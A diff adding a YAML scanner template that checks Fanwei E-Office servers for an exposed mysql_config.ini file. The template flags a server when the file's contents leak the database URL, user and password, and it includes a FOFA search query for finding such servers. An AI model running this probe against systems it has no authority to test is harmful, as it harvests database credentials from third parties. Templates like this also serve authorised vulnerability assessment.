@@ -1,0 +1,48 @@
+id: ecology-mysql-config
+
+info:
+  name: Fanwei OA E-Office - Information Disclosure
+  author: ritikchaddha
+  severity: medium
+  description: |
+    Fanwei E-Office mysql_config.ini file can be directly accessed, leaking database account password and other information.
+  metadata:
+    max-request: 1
+    verified: "true"
+    fofa-query: app="泛微-EOffice"
+  tags: generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mysql_config.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "dataurl"
+          - "datapassword"
+          - "datauser"
+        condition: and
+        case-insensitive: true
+        
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+          - "bytes"
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        negative: true
+        
+      - type: status
+        status:
+          - 200
+          - 206
+        condition: or
